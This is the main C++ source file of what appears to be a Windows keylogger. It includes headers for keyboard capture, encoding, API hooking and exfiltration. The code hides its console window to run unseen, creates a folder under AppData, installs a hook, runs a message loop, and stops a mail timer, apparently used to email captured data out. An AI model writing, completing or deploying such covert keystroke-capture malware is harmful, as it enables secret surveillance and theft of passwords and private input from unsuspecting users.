//This is me ignoring the fact that in the auxiliary header file, I used the unsafe localtime function instead of the safe localtime_s function
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include "Auxiliary.h"
#include "Keyboard.h"
#include "Encoder.h"
#include "IO.h"
#include "Timer.h" //Remove or replace w/ something better
#include "Exfiltrate.h"
#include "APIHook.h"


//STD Namespace Imports
using std::cout;

//Method Prototypes
void hideConsole();
bool isConsoleVisible();


int main()
{
    
    hideConsole();
    
    if (!isConsoleVisible())
    {
        MSG Msg;

        IO::createDirectory(IO::getAppDataPath(true));
        APIHook::installHook();

        while (GetMessage(&Msg, NULL, 0, 0))
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }
        
        APIHook::mailTimer.Stop();

    }
    else
    {
        exit(-1);
    }

    

    return 0;
}

void hideConsole()
{
    //This returns a windows handle (HWND) to ShowWindow() which will in turn hide it, use SW_RESTORE to bring back!

    ::ShowWindow(GetConsoleWindow(), SW_HIDE);
}

bool isConsoleVisible()
{
    return ::IsWindowVisible(::GetConsoleWindow());
}
